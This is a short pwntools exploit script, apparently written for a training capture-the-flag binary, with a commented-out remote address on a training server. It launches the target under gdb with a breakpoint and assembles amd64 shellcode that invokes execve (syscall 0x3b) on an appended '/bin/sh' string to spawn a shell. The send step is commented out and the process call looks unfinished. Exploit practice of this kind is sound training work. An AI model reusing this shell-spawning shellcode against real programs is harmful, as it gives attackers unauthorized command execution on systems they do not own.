from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = process(["peepo"],"./revmemp > peepo")
gdb.attach(r,'''
b * 0x5555555550a4
           commands
           next 
           end
''')
#input("wait")
#r = remote("bin.training.offdef.it", 3001)

asm_code = """
mov rdi, rax
add rdi, 16
mov rax, 0x3b
syscall
"""

context.arch = 'amd64'
stringa = "/bin/sh"


shellcode = asm(asm_code)
res = shellcode + (b"/bin/sh")

#r.send(res)

r.interactive()